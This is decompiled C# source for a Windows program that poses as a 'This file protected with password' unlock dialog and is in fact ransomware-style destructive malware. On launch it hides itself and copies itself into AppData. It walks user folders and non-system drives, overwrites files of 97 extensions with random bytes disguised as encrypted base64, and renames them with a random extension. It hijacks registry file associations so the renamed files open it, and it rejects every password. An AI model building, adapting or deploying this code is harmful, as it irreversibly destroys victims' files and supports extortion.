using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using UnlockYourFiles.Login;

namespace LoginModern;

public class login : Form
{
	private static string string_0 = Process.GetCurrentProcess().MainModule!.FileName;

	private static string string_1 = "BascordApp";

	private static string string_2 = "TypeYourPassword";

	private static string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1 + "\\";

	private static string string_4 = string_3 + string_2 + ".exe";

	private static string string_5 = string_3 + "filesx0\\";

	private static Random random_0 = new Random();

	private static string string_6 = random_0.Next(111, 999).ToString();

	private static Random random_1 = new Random();

	private static Func<string, char> func_0;

	private static Func<string, DirectoryInfo> func_1;

	private static Func<DirectoryInfo, bool> func_2;

	private static Func<DirectoryInfo, bool> func_3;

	private static Func<DirectoryInfo, string> func_4;

	internal int int_0 = 0;

	internal string string_7;

	internal string string_8;

	internal string[] string_9;

	internal string[] string_10;

	internal IContainer icontainer_0;

	internal Panel panel1;

	internal TextBox txtpass;

	internal Label label1;

	internal Button btnlogin;

	internal PictureBox btnCerrar;

	internal PictureBox btnMinimizar;

	internal PictureBox pictureBox1;

	internal LinkLabel linkregis;

	internal Label label2;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public login()
	{
		string text = (string_7 = Environment.UserName);
		string text2 = (string_8 = "C:\\Users\\");
		string[] array = (string_9 = new string[97]
		{
			".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
			".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".php", ".asp",
			".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".cs", ".mp3", ".mp4", ".dwg",
			".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso",
			".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg", ".xz",
			".mpeg", ".mp3", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv", ".mp3",
			".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".m4a", ".wma", ".flv",
			".sie", ".sum", ".ibank", ".wallet", ".rb", ".crt", ".xlsm", ".xlsb", ".7z", ".cpp",
			".java", ".jpe", ".blob", ".wps", ".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv",
			".m4p", ".svg", ".ods", ".bk", ".vdi", ".vmdk", ".jsp"
		});
		string[] array2 = (string_10 = new string[9] { ".doc", ".docx", ".xls", ".xlsx", ".png", ".jpg", ".png", "jpeg", ".zip" });
		IContainer container = (icontainer_0 = null);
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void txtpass_Enter(object sender, EventArgs e)
	{
		if (((Control)txtpass).get_Text() == "Type tour password...")
		{
			((Control)txtpass).set_Text("");
			((Control)txtpass).set_ForeColor(Color.LightGray);
			txtpass.set_UseSystemPasswordChar(true);
		}
	}

	private void txtpass_Leave(object sender, EventArgs e)
	{
		if (((Control)txtpass).get_Text() == "")
		{
			((Control)txtpass).set_Text("Type tour password...");
			((Control)txtpass).set_ForeColor(Color.DimGray);
			txtpass.set_UseSystemPasswordChar(false);
		}
	}

	private void btnCerrar_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void btnMinimizar_Click(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void linkregis_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		((Form)this).set_TopMost(false);
		registro registro2 = new registro();
		((Control)registro2).Show();
	}

	private void login_Load(object sender, EventArgs e)
	{
		if (string_0.Contains(string_1))
		{
			((Control)linkregis).Select();
			((Form)this).set_TopMost(true);
			((Form)this).set_Opacity(90.0);
			return;
		}
		new Mutex(initiallyOwned: true, "user45f56", out var createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		((Form)this).set_Opacity(0.0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
		if (smethod_1())
		{
			smethod_2(string_6, string_4, string_2 + ".exe");
			method_1();
			smethod_2(string_6, string_4, string_2 + ".exe");
			method_2();
			Environment.Exit(0);
		}
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void btnlogin_Click(object sender, EventArgs e)
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_TopMost(false);
		if (((Control)txtpass).get_Text() == "" || ((Control)txtpass).get_Text() == "Type tour password...")
		{
			msgbox msgbox = new msgbox();
			((Control)msgbox).Hide();
			msgbox.changeLabel("Please provide password!");
			((Form)msgbox).ShowDialog();
			((Component)(object)msgbox).Dispose();
		}
		else
		{
			Thread.Sleep(500);
			msgbox msgbox = new msgbox();
			msgbox.changeLabel("Password is incorrect!");
			((Form)msgbox).ShowDialog();
			((Component)(object)msgbox).Dispose();
		}
	}

	private static byte[] smethod_0(int int_1)
	{
		Random random = new Random();
		int_1++;
		byte[] array = new byte[int_1];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		IEnumerable<string> source = Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length);
		if (func_0 == null)
		{
			func_0 = smethod_3;
		}
		return new string(source.Select(func_0).ToArray());
	}

	public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + RandomString(31) + "<EncyptedKey> " + Convert.ToBase64String(bytes);
	}

	private void method_0(string string_11)
	{
		try
		{
			string[] files = Directory.GetFiles(string_11);
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!string_9.Contains(extension.ToLower()))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					if (fileInfo.Length < 1098576L)
					{
						if (int_0 < 4 && Directory.Exists(string_5) && string_10.Contains(extension.ToLower()))
						{
							File.Move(files[i], string_5 + fileName);
							File.Delete(files[i]);
							int_0++;
						}
						if (File.Exists(files[i]))
						{
							string @string = Encoding.UTF8.GetString(smethod_0(Convert.ToInt32(fileInfo.Length) / 3));
							File.WriteAllText(files[i], Base64Encode(@string));
							File.Move(files[i], files[i] + "." + string_6);
						}
					}
					else
					{
						string @string = Encoding.UTF8.GetString(smethod_0(418576));
						File.WriteAllText(files[i], Base64Encode(@string));
						File.Move(files[i], files[i] + "." + string_6);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(string_11);
			if (func_1 == null)
			{
				func_1 = smethod_4;
			}
			IEnumerable<DirectoryInfo> source = directories.Select(func_1);
			if (func_2 == null)
			{
				func_2 = smethod_5;
			}
			IEnumerable<DirectoryInfo> source2 = source.Where(func_2);
			if (func_3 == null)
			{
				func_3 = smethod_6;
			}
			IEnumerable<DirectoryInfo> source3 = source2.Where(func_3);
			if (func_4 == null)
			{
				func_4 = smethod_7;
			}
			string[] array = source3.Select(func_4).ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				method_0(array[i]);
			}
		}
		catch (Exception)
		{
		}
	}

	private void method_1()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				method_0(driveInfo.ToString());
			}
		}
		string string_ = this.string_8 + this.string_7 + "\\Desktop";
		string string_2 = this.string_8 + this.string_7 + "\\Links";
		string string_3 = this.string_8 + this.string_7 + "\\Contacts";
		string string_4 = this.string_8 + this.string_7 + "\\Desktop";
		string string_5 = this.string_8 + this.string_7 + "\\Documents";
		string string_6 = this.string_8 + this.string_7 + "\\Downloads";
		string string_7 = this.string_8 + this.string_7 + "\\Pictures";
		string string_8 = this.string_8 + this.string_7 + "\\Music";
		string string_9 = this.string_8 + this.string_7 + "\\OneDrive";
		string string_10 = this.string_8 + this.string_7 + "\\Saved Games";
		string string_11 = this.string_8 + this.string_7 + "\\Favorites";
		string string_12 = this.string_8 + this.string_7 + "\\Searches";
		string string_13 = this.string_8 + this.string_7 + "\\Videos";
		method_0(string_);
		method_0(string_2);
		method_0(string_3);
		method_0(string_4);
		method_0(string_5);
		method_0(string_6);
		method_0(string_7);
		method_0(string_8);
		method_0(string_9);
		method_0(string_10);
		method_0(string_11);
		method_0(string_12);
		method_0(string_13);
	}

	private static bool smethod_1()
	{
		if (!Directory.Exists(string_3))
		{
			Directory.CreateDirectory(string_3);
		}
		if (!File.Exists(string_4))
		{
			File.Copy(string_0, string_4);
		}
		else
		{
			try
			{
				File.Delete(string_4);
				File.Copy(string_0, string_4);
			}
			catch
			{
			}
		}
		if (!Directory.Exists(string_5))
		{
			Directory.CreateDirectory(string_5);
		}
		else
		{
			Directory.Delete(string_5, recursive: true);
			Directory.CreateDirectory(string_5);
		}
		if (File.Exists(string_4))
		{
			return true;
		}
		return false;
	}

	private void method_2()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (process.MainModule!.FileName!.ToLower().EndsWith(":\\windows\\explorer.exe"))
				{
					process.Kill();
					break;
				}
			}
			catch
			{
			}
		}
		Process.Start("explorer.exe");
	}

	private static void smethod_2(string string_11, string string_12, string string_13)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\", writable: true))
			{
				using RegistryKey registryKey6 = registryKey.CreateSubKey("." + string_11);
				using RegistryKey registryKey2 = registryKey.CreateSubKey(string_11 + "_auto_file");
				using RegistryKey registryKey7 = registryKey2.CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command");
				using RegistryKey registryKey8 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\", writable: true);
				using RegistryKey registryKey3 = registryKey.CreateSubKey("Applications");
				using RegistryKey registryKey4 = registryKey3.CreateSubKey(string_13);
				using RegistryKey registryKey9 = registryKey4.CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command");
				using RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\." + string_11);
				using RegistryKey registryKey10 = registryKey5.OpenSubKey("UserChoice");
				registryKey6.SetValue("", string_11 + "_auto_file", RegistryValueKind.String);
				registryKey.SetValue("", string_11 + "_auto_file", RegistryValueKind.String);
				registryKey.CreateSubKey(string_11 + "_auto_file");
				registryKey7.SetValue("", "\"" + string_12 + "\" \"%1\"");
				registryKey8.SetValue(string_11 + "_auto_file_." + string_11, 0);
				registryKey8.SetValue("Applications\\" + string_13 + "_." + string_11, 0);
				registryKey9.SetValue("", "\"" + string_12 + "\" \"%1\"");
				registryKey5.CreateSubKey("OpenWithList").SetValue("a", string_13);
				registryKey5.CreateSubKey("OpenWithProgids").SetValue(string_11 + "_auto_file", "0");
				if (registryKey10 != null)
				{
					registryKey5.DeleteSubKey("UserChoice");
				}
				registryKey5.CreateSubKey("UserChoice").SetValue("ProgId", "Applications\\" + string_13);
			}
			SHChangeNotify(134217728u, 0u, IntPtr.Zero, IntPtr.Zero);
		}
		catch
		{
		}
	}

	[DllImport("shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02de: Expected O, but got Unknown
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_0492: Unknown result type (might be due to invalid IL or missing references)
		//IL_049c: Expected O, but got Unknown
		//IL_0523: Unknown result type (might be due to invalid IL or missing references)
		//IL_052d: Expected O, but got Unknown
		//IL_05ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f4: Expected O, but got Unknown
		//IL_067b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0685: Expected O, but got Unknown
		//IL_06b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ba: Expected O, but got Unknown
		//IL_0819: Unknown result type (might be due to invalid IL or missing references)
		//IL_0823: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(login));
		Panel val = (panel1 = new Panel());
		PictureBox val2 = (pictureBox1 = new PictureBox());
		TextBox val3 = (txtpass = new TextBox());
		Label val4 = (label1 = new Label());
		Button val5 = (btnlogin = new Button());
		PictureBox val6 = (btnCerrar = new PictureBox());
		PictureBox val7 = (btnMinimizar = new PictureBox());
		LinkLabel val8 = (linkregis = new LinkLabel());
		Label val9 = (label2 = new Label());
		((Control)panel1).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)btnCerrar).BeginInit();
		((ISupportInitialize)btnMinimizar).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.FromArgb(34, 36, 49));
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel1).set_Dock((DockStyle)3);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(219, 218));
		((Control)panel1).set_TabIndex(0);
		((Control)panel1).add_Paint(new PaintEventHandler(panel1_Paint));
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(44, 48));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(115, 119));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)txtpass).set_BackColor(Color.FromArgb(15, 15, 15));
		((TextBoxBase)txtpass).set_BorderStyle((BorderStyle)0);
		((Control)txtpass).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)txtpass).set_ForeColor(Color.DimGray);
		((Control)txtpass).set_Location(new Point(252, 74));
		((TextBoxBase)txtpass).set_MaxLength(30);
		((Control)txtpass).set_Name("txtpass");
		((Control)txtpass).set_Size(new Size(408, 19));
		((Control)txtpass).set_TabIndex(2);
		((Control)txtpass).set_Text("Type tour password...");
		((Control)txtpass).add_Enter((EventHandler)txtpass_Enter);
		((Control)txtpass).add_Leave((EventHandler)txtpass_Leave);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.DimGray);
		((Control)label1).set_Location(new Point(225, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(396, 29));
		((Control)label1).set_TabIndex(4);
		((Control)label1).set_Text("This file protected with password");
		((Control)btnlogin).set_BackColor(Color.FromArgb(40, 40, 40));
		((Control)btnlogin).set_Cursor(Cursors.get_Hand());
		((ButtonBase)btnlogin).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnlogin).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(28, 28, 28));
		((ButtonBase)btnlogin).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(64, 64, 64));
		((ButtonBase)btnlogin).set_FlatStyle((FlatStyle)0);
		((Control)btnlogin).set_Font(new Font("Arial", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnlogin).set_ForeColor(Color.LightGray);
		((Control)btnlogin).set_Location(new Point(244, 127));
		((Control)btnlogin).set_Name("btnlogin");
		((Control)btnlogin).set_Size(new Size(408, 40));
		((Control)btnlogin).set_TabIndex(3);
		((Control)btnlogin).set_Text("Unlock File");
		((ButtonBase)btnlogin).set_UseVisualStyleBackColor(false);
		((Control)btnlogin).add_Click((EventHandler)btnlogin_Click);
		((Control)btnCerrar).set_BackColor(Color.FromArgb(15, 15, 15));
		btnCerrar.set_Image((Image)componentResourceManager.GetObject("btnCerrar.Image"));
		((Control)btnCerrar).set_Location(new Point(653, 9));
		((Control)btnCerrar).set_Name("btnCerrar");
		((Control)btnCerrar).set_Size(new Size(25, 25));
		btnCerrar.set_SizeMode((PictureBoxSizeMode)3);
		btnCerrar.set_TabIndex(7);
		btnCerrar.set_TabStop(false);
		((Control)btnCerrar).add_Click((EventHandler)btnCerrar_Click);
		btnMinimizar.set_Image((Image)componentResourceManager.GetObject("btnMinimizar.Image"));
		((Control)btnMinimizar).set_Location(new Point(622, 9));
		((Control)btnMinimizar).set_Name("btnMinimizar");
		((Control)btnMinimizar).set_Size(new Size(25, 25));
		btnMinimizar.set_SizeMode((PictureBoxSizeMode)3);
		btnMinimizar.set_TabIndex(8);
		btnMinimizar.set_TabStop(false);
		((Control)btnMinimizar).add_Click((EventHandler)btnMinimizar_Click);
		linkregis.set_ActiveLinkColor(Color.FromArgb(0, 122, 204));
		((Control)linkregis).set_AutoSize(true);
		((Control)linkregis).set_Cursor(Cursors.get_Hand());
		((Control)linkregis).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		linkregis.set_LinkColor(Color.DimGray);
		((Control)linkregis).set_Location(new Point(309, 185));
		((Control)linkregis).set_Name("linkregis");
		((Control)linkregis).set_Size(new Size(261, 24));
		((Control)linkregis).set_TabIndex(9);
		linkregis.set_TabStop(true);
		((Control)linkregis).set_Text("How can I get password?");
		linkregis.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkregis_LinkClicked));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_CausesValidation(false);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)4, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.DarkGray);
		((Control)label2).set_Location(new Point(252, 96));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(391, 13));
		((Control)label2).set_TabIndex(10);
		((Control)label2).set_Text("                                                                                                                                ");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(15, 15, 15));
		((Form)this).set_ClientSize(new Size(694, 218));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)linkregis);
		((Control)this).get_Controls().Add((Control)(object)btnMinimizar);
		((Control)this).get_Controls().Add((Control)(object)btnCerrar);
		((Control)this).get_Controls().Add((Control)(object)btnlogin);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)txtpass);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("login");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Tag((object)"              ");
		((Control)this).set_Text("File protected");
		((Form)this).add_Load((EventHandler)login_Load);
		((Control)panel1).ResumeLayout(false);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)btnCerrar).EndInit();
		((ISupportInitialize)btnMinimizar).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private static char smethod_3(string string_11)
	{
		return string_11[random_1.Next(string_11.Length)];
	}

	private static DirectoryInfo smethod_4(string string_11)
	{
		return new DirectoryInfo(string_11);
	}

	private static bool smethod_5(DirectoryInfo directoryInfo_0)
	{
		return directoryInfo_0.Attributes.HasFlag(FileAttributes.Directory);
	}

	private static bool smethod_6(DirectoryInfo directoryInfo_0)
	{
		return !directoryInfo_0.Attributes.HasFlag(FileAttributes.System);
	}

	private static string smethod_7(DirectoryInfo directoryInfo_0)
	{
		return directoryInfo_0.FullName;
	}
}
